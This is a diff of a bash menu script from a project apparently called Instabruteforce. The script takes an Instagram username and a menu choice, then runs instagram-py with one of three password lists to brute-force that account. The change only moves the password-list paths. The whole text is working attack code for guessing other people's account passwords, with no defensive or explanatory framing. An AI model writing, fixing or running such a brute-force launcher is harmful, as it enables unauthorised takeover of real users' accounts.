@@ -32,15 +32,15 @@ read -p "[#] Enter Selected Number: " marks
 echo 
 if [ $marks = 1 ]
 then
-    instagram-py --username $usrnm --password-list $HOME/Instabruteforce/pass/pass1.txt 
+    instagram-py --username $usrnm --password-list $HOME/Instabruteforce/pass1.txt 
  
 elif [ $marks = 2 ]
 then
-    instagram-py --username $usrnm --password-list $HOME/Instabruteforce/pass/pass2.txt
+    instagram-py --username $usrnm --password-list $HOME/Instabruteforce/pass2.txt
  
 elif [ $marks = 3 ]
 then
-    instagram-py --username $usrnm --password-list $HOME/Instabruteforce/pass/pass3.txt
+    instagram-py --username $usrnm --password-list $HOME/Instabruteforce/pass3.txt
 else
 echo
 echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"
